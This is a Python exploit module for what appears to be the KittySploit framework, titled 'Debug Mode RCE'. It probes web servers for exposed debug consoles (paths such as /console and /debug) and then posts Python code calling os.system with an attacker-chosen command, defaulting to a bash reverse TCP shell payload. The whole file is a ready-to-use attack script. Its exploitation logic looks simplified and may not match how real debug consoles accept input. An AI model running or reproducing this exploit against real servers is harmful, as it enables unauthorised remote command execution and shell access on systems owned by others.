#!/usr/bin/env python3
# -*- coding: utf-8 -*-

from kittysploit import *
from lib.protocols.http.http_client import Http_client
import urllib.parse

class Module(Exploit, Http_client):

    __info__ = {
        "name": "Debug Mode RCE",
        "description": "Remote Code Execution exploit for applications with debug/development mode enabled (Django, Flask, etc.)",
        "author": "KittySploit Team",
        "cve": [],
        "arch": [Arch.X86, Arch.X64],
        "platform": Platform.MULTI,
        "category": "singles",
        "payload": {
            "default": "payloads/singles/cmd/unix/bash_reverse_tcp",
            "arch": "cmd",
            "platform": ["unix", "linux"],
            "category": "singles",
        }
    }

    debug_endpoint = OptString("/console", "Debug console endpoint", required=False)
    command_param = OptString("__debugger__", "Parameter name for command execution", required=False)

    def check(self):
        """
        Check if debug mode is enabled
        """
        try:
            # Check for common debug endpoints
            debug_paths = ['/console', '/debug', '/_debug', '/dev', '/development']
            
            for path in debug_paths:
                response = self.http_request(method="GET", path=path, allow_redirects=False)
                if response and response.status_code == 200:
                    content = response.text.lower()
                    if 'debug' in content or 'console' in content or 'werkzeug' in content:
                        return {
                            'vulnerable': True,
                            'reason': f'Debug endpoint found at {path}',
                            'confidence': 'high'
                        }
            
            return {
                'vulnerable': False,
                'reason': 'No debug endpoints found',
                'confidence': 'medium'
            }
        except Exception as e:
            return {
                'vulnerable': False,
                'reason': f'Check failed: {str(e)}',
                'confidence': 'low'
            }

    def run(self):
        """
        Execute the exploit
        """
        try:
            print_status("Attempting debug mode RCE exploit...")
            
            endpoint = self.debug_endpoint.value if self.debug_endpoint.value else "/console"
            param = self.command_param.value if self.command_param.value else "__debugger__"
            
            # Try Werkzeug console PIN bypass or command execution
            command = self.payload
            
            # Construct payload
            payload_data = {
                param: f'__import__("os").system("{command}")'
            }
            
            response = self.http_request(
                method="POST",
                path=endpoint,
                data=payload_data,
                allow_redirects=False,
                timeout=10
            )
            
            if response and response.status_code in [200, 302]:
                print_success("Command executed successfully")
                self.vulnerable()
                return True
            
            print_error("Exploitation failed - debug mode may not be exploitable")
            self.not_vulnerable()
            return False
            
        except Exception as e:
            print_error(f"Exploitation failed: {e}")
            return False
